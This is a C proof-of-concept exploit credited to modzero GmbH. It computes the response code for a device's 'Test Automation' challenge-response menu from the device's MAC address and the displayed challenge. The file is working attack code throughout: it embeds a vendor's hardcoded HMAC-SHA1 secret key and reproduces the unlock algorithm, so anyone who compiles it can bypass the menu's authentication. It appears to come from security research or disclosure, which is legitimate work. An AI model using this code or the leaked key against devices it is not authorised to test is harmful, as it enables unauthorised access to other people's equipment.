// Proof of Concept exploit - Test Automation Response
// Copyright (C) 2023, modzero GmbH
// gcc -Wall -o poc poc-ta.c -lssl -lcrypto 
//

#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/bn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <mac> <challenge>\n", argv[0]);
        printf("[*] Please provide the MAC address and the challenge stated in \n");
        printf("[*] the Test Automation menu.\n"); 
        printf("    %s 12345ffffff 425813540719\n", argv[0]);        
        return -1;
    }

    char *input_mac = argv[1];
    size_t input_length = strlen(input_mac);
    if (input_length != 12) {
        printf("[!] MAC length must be 12 characters\n");
        return -1;
    }

    // Allocate memory for the new array
    unsigned char *input_array = (unsigned char *) malloc(10); // +1 for the null terminator
    if (input_array == NULL) {
        printf("[!] Memory allocation failed");
        return -1;
    }

    // Convert each pair of MAC chars to a byte value
    for (size_t i = 0; i < 6; i++) {
        sscanf(&input_mac[i * 2], "%2hhx", &input_array[i]);
    }

    // Last two digits of the challenge are ignored
    char* challenge_string = argv[2];
    int length = strlen(challenge_string);
    challenge_string[length - 2] = '\0';
    int challenge = atoi(challenge_string);
    
    // Set up everything
    unsigned char key[] = {0x83,0xbd,0x5b,0xd1,0xaf,0xe9,0x6c,0xce,0x57,0x64,0x72,0x87,0x95,0x56,0xec,0xea,0x63,0x6e,0xc1,0x90};
    unsigned char hmac[200];
    unsigned int hmac_len = 0;
    BIGNUM *bigNum = BN_new();
    char *response;

    // Append the bytes of the challenge to the MAC array
    unsigned char bytes[4];
    bytes[0] = (challenge >> 24);
    bytes[1] = (challenge >> 16);
    bytes[2] = (challenge >> 8);
    bytes[3] = challenge;
    for (int i = 0; i < 4; i++) {
        input_array[6 + i] = bytes[i];
    }
    
    // Compute the HMAC
    const EVP_MD *evp_md = EVP_sha1();
    HMAC(evp_md, key, 0x14, input_array, 10, hmac, &hmac_len);

    // Initialize the BIGNUM and convert hmac to BIGNUM and string
    BN_bin2bn(hmac, hmac_len, bigNum);
    response = BN_bn2dec(bigNum);

    // Only the last 0x14 digits are the response code
    size_t str_len_response = strlen(response);
    printf("[+] Code: %s\n", (response + (str_len_response - 0x14)));
    free(input_array);

    return 0;
}